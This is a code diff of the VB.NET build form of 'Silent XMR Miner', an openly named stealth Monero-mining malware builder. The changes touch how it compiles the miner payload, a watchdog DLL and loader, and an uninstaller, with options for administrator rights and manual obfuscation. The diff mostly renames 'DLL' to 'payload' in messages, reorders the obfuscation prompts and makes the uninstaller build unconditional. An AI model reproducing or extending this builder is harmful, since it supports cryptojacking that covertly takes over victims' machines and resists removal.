@@ -8,7 +8,7 @@ Public Class Form1
     Public watchdogdata As Byte() = New Byte() {}
     Public FA As New Advanced
 
-    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
+    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, initially based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
         Font = New Font("Segoe UI", 9.5F, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
@@ -109,17 +109,17 @@ Public Class Form1
 
                     Codedom.WatchdogCompiler(watchdogpath & ".dll", My.Resources.Watchdog)
                     If Codedom.WatchdogOK Then
-                        txtLog.Text = txtLog.Text + ("Compiled Watchdog DLL!" + vbNewLine)
+                        txtLog.Text = txtLog.Text + ("Compiled Watchdog payload!" + vbNewLine)
                         If FA.toggleObfuscation.Checked Then
-                            MessageBox.Show("The Watchdog DLL has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".dll" & "). Press OK after you're done with obfuscating the Watchdog DLL.")
+                            MessageBox.Show("The Watchdog payload has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".dll" & "). Press OK after you're done with obfuscating and replacing the Watchdog payload.")
                         End If
-                        Codedom.LoaderCompiler(watchdogpath & ".exe", File.ReadAllBytes(watchdogpath & ".dll"))
+                        Codedom.LoaderCompiler(watchdogpath & ".exe", File.ReadAllBytes(watchdogpath & ".dll"), Nothing, FA.toggleAdministrator.Checked)
 
                         If Codedom.LoaderOK Then
-                            If FA.toggleObfuscation.Checked Then
-                                MessageBox.Show("The Watchdog Loader has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating the Watchdog Loader.")
-                            End If
                             txtLog.Text = txtLog.Text + ("Compiled Watchdog loader!" + vbNewLine)
+                            If FA.toggleObfuscation.Checked Then
+                                MessageBox.Show("The Watchdog loader has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating and replacing the Watchdog loader.")
+                            End If
                             watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
                             File.Delete(watchdogpath & ".dll")
                             File.Delete(watchdogpath & ".exe")
@@ -139,17 +139,18 @@ Public Class Form1
             Dim minerpath As String = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-miner.dll"
             Codedom.MinerCompiler(minerpath, MinerSource, Resources_Parent)
             If Codedom.MinerOK Then
-                txtLog.Text = txtLog.Text + ("Compiled Miner DLL!" + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Compiled Miner payload!" + vbNewLine)
                 If FA.toggleObfuscation.Checked Then
-                    MessageBox.Show("The Miner DLL has been compiled and can be found in the same folder as the chosen miner path (" & minerpath & "). Press OK after you're done with obfuscating the Miner DLL.")
+                    MessageBox.Show("The Miner payload has been compiled and can be found in the same folder as the chosen miner path (" & minerpath & "). Press OK after you're done with obfuscating and replacing the Miner payload.")
                 End If
                 Codedom.LoaderCompiler(OutputPayload, File.ReadAllBytes(minerpath), If(chkIcon.Checked AndAlso txtIconPath.Text IsNot "", txtIconPath.Text, Nothing), FA.toggleAdministrator.Checked)
-                If FA.toggleUninstaller.Checked Then
-                    Codedom.UninstallerCompiler(Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-uninstaller.exe")
-                End If
+                Codedom.UninstallerCompiler(Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-uninstaller.exe")
 
                 If Codedom.LoaderOK Then
                     txtLog.Text = txtLog.Text + ("Compiled Miner loader!" + vbNewLine)
+                    If FA.toggleObfuscation.Checked Then
+                        MessageBox.Show("The Miner loader has been compiled and can be found in the same folder as the chosen miner path (" & OutputPayload & "). Press OK after you're done with obfuscating and replacing the Miner loader.")
+                    End If
                     txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                     If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                     btnBuild.Enabled = True
